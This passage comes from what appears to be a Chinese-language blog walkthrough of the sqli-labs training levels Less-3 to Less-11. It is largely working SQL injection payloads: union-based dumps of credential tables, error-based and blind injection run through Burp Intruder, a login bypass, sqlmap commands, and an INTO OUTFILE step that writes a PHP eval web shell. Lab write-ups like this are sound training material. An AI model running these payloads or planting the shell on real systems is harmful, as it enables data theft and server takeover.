class=\"line\">爆库，第二个字段拼接改连接所有数据库名：http://www.sqli-labs.com/Less-3?id=-1&#x27;) union select 1,group_concat(schema_name),3 from information_schema.schemata --+爆当前数据库的表：http://www.sqli-labs.com/Less-3?id=-1&#x27;) union select 1,group_concat(table_name),3 from information_schema.tables where database()=table_schema --+爆字段：http://www.sqli-labs.com/Less-3?id=-1&#x27;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+爆字段值：http://www.sqli-labs.com/Less-3?id=-1&#x27;) union select 1,group_concat(concat_ws(&#x27;--&#x27;,username,password)),3 from users --+</span><br></pre></td></tr></table></figure>\n<h2 id=\"总结-3\"><a class=\"markdownIt-Anchor\" href=\"#总结-3\">#</a> 总结</h2>\n<p>?id=1&quot; 竟然正常返回信息了！！！</p>\n<p>因为 id=xx (‘1&quot;’) 了啊，根本没闭合啊，有点弱智哦</p>\n<hr>\n<h1 id=\"less-4\"><a class=\"markdownIt-Anchor\" href=\"#less-4\">#</a> Less-4</h1>\n<p>date:2020-11-17 11:25:45</p>\n<h2 id=\"过程-4\"><a class=\"markdownIt-Anchor\" href=\"#过程-4\">#</a> 过程</h2>\n<h3 id=\"sqlmap-4\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-4\">#</a> sqlmap</h3>\n<p>同 Less-1</p>\n<h3 id=\"手工注入-4\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-4\">#</a> 手工注入</h3>\n<p>发现双引号报错，所以可以直接在后面加 &quot;) %23+ 进行闭合</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-4?id=1&quot;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot;1&quot;&quot;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>根据 order by 确定是三个字段后，union select 拿数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">爆库，第二个字段拼接改连接所有数据库名：http://www.sqli-labs.com/Less-4?id=-1&quot;) union select 1,group_concat(schema_name),3 from information_schema.schemata --+爆当前数据库的表：http://www.sqli-labs.com/Less-4?id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where database()=table_schema --+爆字段：http://www.sqli-labs.com/Less-4?id=-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+爆字段值：http://www.sqli-labs.com/Less-4?id=-1&quot;) union select 1,group_concat(concat_ws(&#x27;--&#x27;,username,password)),3 from users --+</span><br></pre></td></tr></table></figure>\n<h2 id=\"总结-4\"><a class=\"markdownIt-Anchor\" href=\"#总结-4\">#</a> 总结</h2>\n<p>没啥好说的</p>\n<hr>\n<h1 id=\"less-5\"><a class=\"markdownIt-Anchor\" href=\"#less-5\">#</a> Less-5</h1>\n<p>date:2020-11-17 11:48:40</p>\n<h2 id=\"过程-5\"><a class=\"markdownIt-Anchor\" href=\"#过程-5\">#</a> 过程</h2>\n<h3 id=\"sqlmap-5\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-5\">#</a> sqlmap</h3>\n<p>同 Less-1</p>\n<h3 id=\"手工注入-5\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-5\">#</a> 手工注入</h3>\n<p>单引号报错，payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-5?id=1&#x27;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>‘‘1’’ LIMIT 0,1’第一个单引号真的巨坑，总是眼糊看错成 SQL 语句里面的</p>\n<p>闭合单引号，用 order by 确定是提取了三个字段，但是页面上并没有输出字段的值，目测是后台进行了判断</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-5?id=1&#x27; order by 3 +%23+输出：You are in...........</span><br></pre></td></tr></table></figure>\n<p>前端没有发现啥有用的东西，撸了一下 floor 报错，开干</p>\n<p>爆库 payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-5?id=1&#x27; AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)AND &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>\n<p>然后像以前一样的流程，在 concat 里面找自己要的数据就好了</p>\n<h2 id=\"总结-5\"><a class=\"markdownIt-Anchor\" href=\"#总结-5\">#</a> 总结</h2>\n<ol>\n<li>\n<p><a href=\"https://www.cnblogs.com/litlife/p/8472323.html\">select count (*) from test group by floor (rand (0)*2) 报错原理 666</a></p>\n<p>概括一下:</p>\n<p>floor (rand (0)*2) 是随机 0、1，但是是伪随机 011011…</p>\n<p>count (*) 与 group by 共同工作时会建立一张虚拟表，两个字段 (关键字和数量)</p>\n<p>floor 表达式第一次运算的值为 0，在表中没有找到 key 为 0 的数据，故插入，在插入的过程中需要再取一次 group by 后面的值（即再进行一次 floor 运算，结果为 1），取到了 1，将之插入，并将 count (*) 置 1。</p>\n<p>也就是说一次插入要调用两次 floor，所以在后面碰见 01 时，0 没有，插入 1，但是 1 已经存在，报错</p>\n</li>\n<li>\n<p>payload 是 sqlmap 复制后修改的，自己手动输入的总是说有语法错，我对着看了好多遍感觉没有什么问题啊，无理取闹，后来看报错应该是 and 后面的 select from 的表要别名 (Every derived table must have its own alias)，select from 外面还要加一个括号</p>\n</li>\n</ol>\n<hr>\n<h1 id=\"less-6\"><a class=\"markdownIt-Anchor\" href=\"#less-6\">#</a> Less-6</h1>\n<p>data: 2020-11-17 15:50:40</p>\n<h2 id=\"过程-6\"><a class=\"markdownIt-Anchor\" href=\"#过程-6\">#</a> 过程</h2>\n<h3 id=\"sqlmap-6\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-6\">#</a> sqlmap</h3>\n<p>同 Less-1</p>\n<h3 id=\"手工注入-6\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-6\">#</a> 手工注入</h3>\n<p>输入了 less-5 里面的 payload，发现不报错了！</p>\n<p>机智的我去看 sqlmap 发现就是变成了闭合双引号罢了唉，人傻了</p>\n<p>爆当前库 payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-6?id=1&quot; AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)AND &#x27;1&#x27;=&quot;1</span><br></pre></td></tr></table></figure>\n<p>CONCAT (payload,floor (rand (0)*2)) 作为 group by 的 key</p>\n<h2 id=\"总结-6\"><a class=\"markdownIt-Anchor\" href=\"#总结-6\">#</a> 总结</h2>\n<p>没啥好总结的，还以为又有新东西可以看了</p>\n<hr>\n<h1 id=\"less-7\"><a class=\"markdownIt-Anchor\" href=\"#less-7\">#</a> Less-7</h1>\n<p>date:2020-11-17 16:09:39</p>\n<h2 id=\"过程-7\"><a class=\"markdownIt-Anchor\" href=\"#过程-7\">#</a> 过程</h2>\n<h3 id=\"sqlmap-7\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-7\">#</a> sqlmap</h3>\n<p>同 Less-1</p>\n<p>sqlmap 用的时间盲注，它自己跑着跑着连接就断了，笑死</p>\n<h3 id=\"手工注入-7\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-7\">#</a> 手工注入</h3>\n<p>试了一些，目测后台做了判断</p>\n<p>sql 报错统一输出：</p>\n<p>You have an error in your SQL syntax</p>\n<p>正常输出：You are in… Use outfile…</p>\n<p>盲注的话，二分法判断字符的 ascii 码值，sqlmap 都说它扛不住了</p>\n<p>看见正常输出那里有个 use outfile…，感觉是个提示，新东西就要百度看看，好叭这里直接看通关秘籍了，竟然直接写入文件 getshell 了…</p>\n<p>太帅了，动手撸一遍</p>\n<p>要上传一句话连接的话，需要知道路径，去有回显的题拿路径啦</p>\n<p>basedir 参数指定了安装 MySQL 的安装路径</p>\n<p>datadir 参数指定了 MySQL 的数据库文件放在什么路径下</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-1/?id=-1&#x27; union select 1,@@datadir,@@basedir MYSQL %23+</span><br></pre></td></tr></table></figure>\n<p>输出，并没有 phpstudy 的路径，因为我根本没用 phpstudy 的数据库…：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Your Login name:C:\\ProgramData\\MySQL\\MySQL Server 5.5\\Data\\Your Password:C:/Program Files (x86)/MySQL/MySQL Server 5.5/</span><br></pre></td></tr></table></figure>\n<p>尝试在获取到的路径下存入 php 一句话：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-7/?id=1 union select &#x27;&lt;?php eval(@_POST[&quot;haha&quot;]); ?&gt;&#x27; into outfile &#x27;C:/ProgramData/MySQL/MySQL Server 5.5/Data/haha.php&#x27; %23+</span><br></pre></td></tr></table></figure>\n<p>但是一直报错，愤怒地直接去 mysql 运行的时候，发现报错：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[SQL] select &#x27;&lt;?php eval(@_POST[&quot;haha&quot;]); ?&gt;&#x27; into outfile &#x27;C:/haha.php&#x27;[Err] 1290 - The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</span><br></pre></td></tr></table></figure>\n<p>去查了一下报错原因：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">将桌面文件存储到mysql时报错：The MySQL server is running with the --secure-file-pri option so it cannot execute this.</span><br><span class=\"line\">报错原因：mysql文件的导入和导出路径有默认的设置，即 secure-file-priv,当传入的csv文件路径与默认的路径冲突时就会报错。</span><br><span class=\"line\">secure-file-priv的值有三种情况：secure_file_prive=null ––限制mysqld 不允许导入导出</span><br><span class=\"line\">secure_file_priv=/path/ – --限制mysqld的导入导出只能发生在默认的/path/目录下</span><br><span class=\"line\">secure_file_priv=’’ – --不对mysqld 的导入 导出做限制</span><br></pre></td></tr></table></figure>\n<p>通过命令  <code>select @@secure_file_priv</code>  查询，发现 secure_file_priv 的值为 null，也就是说不允许导入导出</p>\n<p>于是到 mysql 的安装目录下修改 my.ini 配置文件，在 mysqld 节点下加入 secure_file_priv=’’，对导入导出不进行限制</p>\n<p>在尝试 payload 时，</p>\n<p>?id=1 order by 111111 %23 + 不报错</p>\n<p>?id=1’ order by 111111 %23 + 报错</p>\n<p>?id=1&quot; order by 111111 %23 + 不报错</p>\n<p>说明有一个单引号要闭合</p>\n<p>?id=1’ order by 1 %23 + 报错</p>\n<p>?id=1’)) order by 3 %23 + 不报错</p>\n<p>?id=1’)) order by 4 %23 + 报错</p>\n<p>闭合成功，且需要三个字段</p>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-7?id=1&#x27;)) union select &#x27;&lt;?php @eval($_POST[&quot;haha&quot;]); ?&gt;&#x27;,2,3 into outfile &#x27;D:/haha.php&#x27; %23+</span><br></pre></td></tr></table></figure>\n<p>虽然输出还是报错，但是文件已经上传到 D 盘了（因为这个 sql 语句我已经在数据库试了很多遍了…）</p>\n<p>但是因为我的 mysql 不是 PHPstudy 的，所以没有搞到 phpstudy 的路径，没有上传到 phpstudy 目录下，也连接不上解析不了？</p>\n<p>机智的我决定手动复制到 www 下</p>\n<p>上蚁剑连接成功</p>\n<p>另外要看数据库数据的话可以通过改上面的 p 输出文件，然后上蚁剑查看输出的文件内容，其余的爆数据库和之前的题目都一样的流程，例如爆当前数据库名：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-7?id=1&#x27;)) union select database(),2,3 into outfile &#x27;D:/haha.php&#x27; %23+</span><br></pre></td></tr></table></figure>\n<p>因为用命令行登录数据库需要密码</p>\n<h3 id=\"总结-7\"><a class=\"markdownIt-Anchor\" href=\"#总结-7\">#</a> 总结</h3>\n<ol>\n<li>\n<p>MySQL 的 @与 @@区别</p>\n<p>@x 是 用户自定义的变量 (User variables are written as @var_name)</p>\n<p>@@x 是 global 或 session 变量 (@@global @@session)</p>\n</li>\n<li>\n<p>菜鸡的悲哀就是做个题还要靠作弊（菜菜子不要难过！你会变强的！）</p>\n</li>\n</ol>\n<hr>\n<h1 id=\"less-8\"><a class=\"markdownIt-Anchor\" href=\"#less-8\">#</a> Less-8</h1>\n<p>date:2020-11-21 13:58:47</p>\n<h2 id=\"过程-8\"><a class=\"markdownIt-Anchor\" href=\"#过程-8\">#</a> 过程</h2>\n<h3 id=\"sqlmap-8\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-8\">#</a> sqlmap</h3>\n<p>同 less-1，看见 sqlmap 的 payload，它也是盲注咯</p>\n<h3 id=\"手工注入-8\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-8\">#</a> 手工注入</h3>\n<p>单引号闭合后分别 order by 3 和 4，发现一个正常输出一个不输出，说明单引号闭合成功，order by 执行成功，且需要三个字段，payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-8?id=1&#x27; order by 3 %23+http://www.sqli-labs.com/Less-8?id=1&#x27; order by 4 %23+</span><br></pre></td></tr></table></figure>\n<p>没有回显数据，只能盲注</p>\n<p>尝试第七关的 outfile 上传文件，上传成功，上蚁剑连接</p>\n<p>换个思路，上盲注，看题目是布尔盲注，一个一个猜呗，机智的我决定先测试出长度再上 bp 爆</p>\n<p>length () 函数，显而易见是返回里面参数的长度</p>\n<p>substr (a,b,c) 函数，显而易见是截断字符串 a，b 位置开始截取 c 个字符</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-8?id=1&#x27; and (select length(database()))=8 %23+</span><br></pre></td></tr></table></figure>\n<p>=8 时正常输出，说明当前数据库名字长度为 8</p>\n<p>上 bp, 选中 Intruder</p>\n<p>攻击模式可以选 sniper 也可以选 clusterbomb，都很方便，字典直接用 excel 下拉到 127 的…，一个一个打也太费劲了把</p>\n<p>从 1 到 127 一个一个猜数据库名中的字符，根据返回数据的长度不同找到正确的 ascii 码值：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /Less-8/?id=1%27%20and%20(select%20ascii(substr(database(),§1§,1)))=§115§%20%23+ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateDNT: 1Connection: keep-aliveUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cache</span><br></pre></td></tr></table></figure>\n<p>这里就不上 bp 图了，不好搞，用的笛卡尔乘积，发了一千多个请求就爆了个当前数据库名，要爆别的在上面 payload 改改完事：</p>\n<table>\n<thead>\n<tr>\n<th>request</th>\n<th>payload1</th>\n<th>payload2</th>\n<th>status</th>\n<th>timeout</th>\n<th>error</th>\n<th>length</th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0</td>\n<td></td>\n<td></td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>787</td>\n<td>3</td>\n<td>99</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>802</td>\n<td>2</td>\n<td>101</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>838</td>\n<td>6</td>\n<td>105</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>909</td>\n<td>5</td>\n<td>114</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>913</td>\n<td>1</td>\n<td>115</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>927</td>\n<td>7</td>\n<td>116</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>932</td>\n<td>4</td>\n<td>117</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>968</td>\n<td>8</td>\n<td>121</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>1</td>\n<td>1</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>966</td>\n<td></td>\n</tr>\n<tr>\n<td>2</td>\n<td>2</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>966</td>\n<td></td>\n</tr>\n<tr>\n<td>3</td>\n<td>3</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>966</td>\n<td></td>\n</tr>\n<tr>\n<td>4</td>\n<td>4</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>966</td>\n<td></td>\n</tr>\n<tr>\n<td>5</td>\n<td>5</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>966</td>\n<td></td>\n</tr>\n<tr>\n<td>6</td>\n<td>6</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>966</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"总结-8\"><a class=\"markdownIt-Anchor\" href=\"#总结-8\">#</a> 总结</h2>\n<p>盲注一个个手打的话就是很费时间，疲惫</p>\n<p>有 sqlmap 真好</p>\n<hr>\n<h1 id=\"less-9\"><a class=\"markdownIt-Anchor\" href=\"#less-9\">#</a> Less-9</h1>\n<p>date：2020-11-21 15:10:01</p>\n<h2 id=\"过程-9\"><a class=\"markdownIt-Anchor\" href=\"#过程-9\">#</a> 过程</h2>\n<h3 id=\"sqlmap-9\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-9\">#</a> sqlmap</h3>\n<p>同 less-1</p>\n<h3 id=\"手工注入-9\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-9\">#</a> 手工注入</h3>\n<p>不管输入什么都是正常输出，明明输入的 id 数据库里面就没有，还说 you are in，用户体验差评：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Welcome    DhakkanYou are in...........</span><br></pre></td></tr></table></figure>\n<p>利用 if () 函数进行时间盲注，发现闭合单引号的时候它就一直睡觉咯</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-9?id=1&#x27; and if((1=2),1,sleep(2333)) %23</span><br></pre></td></tr></table></figure>\n<p>和布尔盲注类似，但是是根据服务器响应的时间长短进行判断了，开干</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-9?id=1&#x27; and if((length(database())=8),sleep(2333),1) %23</span><br></pre></td></tr></table></figure>\n<p>判断出 database () 的长度是 8 个字符，还是接着上 bp：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /Less-9/?id=1%27%20and%20if((ascii(substr(database(),§1§,1))=§115§),sleep(11),1)%20%23 HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateDNT: 1Connection: keep-aliveUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cache</span><br></pre></td></tr></table></figure>\n<p>bp 的 result，根据 ascii 值就可以吧当前数据名弄出来了：</p>\n<table>\n<thead>\n<tr>\n<th>request</th>\n<th>payload1</th>\n<th>payload2</th>\n<th>status</th>\n<th>timeout</th>\n<th>error</th>\n<th>length</th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0</td>\n<td></td>\n<td></td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>787</td>\n<td>3</td>\n<td>99</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>802</td>\n<td>2</td>\n<td>101</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>838</td>\n<td>6</td>\n<td>105</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>909</td>\n<td>5</td>\n<td>114</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>913</td>\n<td>1</td>\n<td>115</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>927</td>\n<td>7</td>\n<td>116</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>932</td>\n<td>4</td>\n<td>117</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>968</td>\n<td>8</td>\n<td>121</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>1</td>\n<td>1</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>951</td>\n<td></td>\n</tr>\n<tr>\n<td>2</td>\n<td>2</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>951</td>\n<td></td>\n</tr>\n<tr>\n<td>3</td>\n<td>3</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>951</td>\n<td></td>\n</tr>\n<tr>\n<td>4</td>\n<td>4</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>951</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"总结-9\"><a class=\"markdownIt-Anchor\" href=\"#总结-9\">#</a> 总结</h2>\n<p>其实想节省时间可以去看数据库的命名规范，确定要测试的字符有哪些，这样在进行大量数据测试的时候会节省一些时间</p>\n<hr>\n<h1 id=\"less-10\"><a class=\"markdownIt-Anchor\" href=\"#less-10\">#</a> Less-10</h1>\n<p>date：2020-11-21 15:55:10</p>\n<h2 id=\"过程-10\"><a class=\"markdownIt-Anchor\" href=\"#过程-10\">#</a> 过程</h2>\n<h3 id=\"sqlmap-10\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-10\">#</a> sqlmap</h3>\n<p>同 less-1</p>\n<h3 id=\"手工注入-10\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-10\">#</a> 手工注入</h3>\n<p>和 less-9 相比就是单引号闭合变成了双引号闭合</p>\n<p>用这个 payload，服务器就睡觉啦：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-10?id=1&quot; and if((1=1),sleep(2333),1) %23+</span><br></pre></td></tr></table></figure>\n<p>后面的流程和 less-9 一样</p>\n<h2 id=\"总结-10\"><a class=\"markdownIt-Anchor\" href=\"#总结-10\">#</a> 总结</h2>\n<p>遇到这个题目也不知道是该开心还是该开心</p>\n<hr>\n<h1 id=\"less-11\"><a class=\"markdownIt-Anchor\" href=\"#less-11\">#</a> Less-11</h1>\n<p>date：2020-11-21 16:23:25</p>\n<h2 id=\"过程-11\"><a class=\"markdownIt-Anchor\" href=\"#过程-11\">#</a> 过程</h2>\n<p>写完时间盲注的我，看见这道题目，眼前一亮！终于换题目啦哈哈哈哈哈哈哈嗝</p>\n<h3 id=\"sqlmap-11\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-11\">#</a> sqlmap</h3>\n<p>sqlmap 测 post 请求可以用参数 forms</p>\n<p>这里用的–forms 参数，直接搞到所有数据库了：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">py sqlmap.py -u http://www.sqli-labs.com/Less-11 --forms --dbs --batch</span><br></pre></td></tr></table></figure>\n<p>后面爆字段值改参数就可以了，同 less-1</p>\n<h3 id=\"手工注入-11\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-11\">#</a> 手工注入</h3>\n<p>看见登录框就想 admin/123456 登录（竟然失败了！气人！）</p>\n<p>抓包看见的是 post 请求，所以不能和之前一样直接在 url 后面接参数了，那就在输入框直接注入哈哈哈</p>\n<p>payload，username 最后面有个空格，不加空格注释符号和后面的符号连接在一起，就起不到注释的功能啦:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Username :    admin&#x27; or 1=1 -- Password :    123456</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Your Login name:DumbYour Password:Dumb</span><br></pre></td></tr></table></figure>\n<p>有数据回显，舒服了</p>\n<p>上 bp 抓包，直接改后面的参数，根据 order by 确定需要两个字段：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /Less-11/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-11/Content-Type: application/x-www-form-urlencodedContent-Length: 51Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin%27 order by 2+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出，竟然真的有一个 admin/admin…：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your Login name:admin&lt;br&gt;Your Password:admin&lt;br&gt;</span><br></pre></td></tr></table></figure>\n<p>爆数据库 payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=zhatian%27 union select 1,group_concat(schema_name) from information_schema.schemata+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your Login name:1&lt;br&gt;Your 